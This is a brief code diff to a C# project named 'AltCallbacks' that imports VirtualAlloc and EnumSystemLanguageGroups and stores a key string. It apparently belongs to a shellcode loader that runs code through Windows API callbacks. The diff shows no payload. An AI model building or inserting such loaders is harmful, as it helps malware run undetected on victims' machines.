@@ -11,7 +11,7 @@ namespace AltCallbacks
         [DllImport("kernelbase.dll")]
         public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect);
 
-        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        [DllImport("kernel32.dll")]
         public static extern bool EnumSystemLanguageGroups(IntPtr lpLanguageGroupEnumProc, uint dwFlags, IntPtr lParam);
 
         static string key = "THISISMYKEY";
